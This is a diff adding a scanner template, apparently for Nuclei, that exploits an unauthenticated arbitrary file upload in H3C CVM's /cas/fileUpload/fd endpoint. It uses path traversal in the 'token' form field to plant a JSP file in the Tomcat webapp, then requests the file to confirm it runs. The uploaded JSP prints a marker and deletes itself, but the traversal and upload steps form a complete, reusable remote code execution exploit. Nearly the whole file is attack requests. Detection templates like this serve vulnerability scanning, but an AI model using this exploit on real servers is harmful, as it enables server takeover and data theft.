@@ -1,0 +1,41 @@
+id: H3C-CVM-fd-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: H3C CVM /cas/fileUpload/fd 接口存在任意文件上传漏洞，未授权的攻击者可以上传任意文件，获取 webshell，控制服务器权限，读取敏感信息等。
+  reference:
+    - https://github.com/wy876/POC/blob/main/H3C/H3C-CVM-fd%E6%8E%A5%E5%8F%A3%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.md
+  tags: tags
+variables:
+  filename: "{{rand_base(6)}}"
+http:
+  - raw:
+      - |-
+        POST /cas/fileUpload/fd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.123 Safari/537.36
+        Connection: close
+        Content-Type: multipart/form-data; boundary=WebKitFormBoundaryMMqEBbEFHlzOcYq4
+        Connection: close
+        Content-Length: 321
+
+        --WebKitFormBoundaryMMqEBbEFHlzOcYq4
+        Content-Disposition: form-data; name="token"
+
+        /../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/{{filename}}.jsp
+        --WebKitFormBoundaryMMqEBbEFHlzOcYq4
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.jsp"
+        Content-Type: image/png
+
+        <% out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM="))); new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        --WebKitFormBoundaryMMqEBbEFHlzOcYq4--
+      - |+
+        GET /cas/js/lib/buttons/{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'e165421110ba03099a1c0393373c5b43'
